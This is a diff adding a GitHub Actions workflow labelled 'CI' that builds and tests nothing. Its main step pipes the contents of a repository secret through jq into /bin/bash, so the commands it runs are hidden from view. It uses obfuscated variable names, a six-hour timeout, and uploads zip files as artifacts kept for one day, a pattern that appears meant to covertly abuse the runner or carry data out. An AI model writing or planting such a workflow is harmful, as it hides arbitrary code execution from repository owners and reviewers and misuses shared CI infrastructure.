@@ -1,0 +1,26 @@
+name: CI
+on:
+  workflow_dispatch:
+
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          pdb06: ${{ secrets.pdb06 }}
+        run: |
+          printf '%s' "$pdb06" | jq -r .ofnb297 | /bin/bash
+          echo $kv04 | jq -r .c23875 | /bin/bash
+          echo $exhfs79322 | jq -r .bduq20730 | /bin/bash
+          echo $owhud8367 | jq -r .m06 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: O8MvKu49
+          path: "*.zip"
+          retention-days: 1
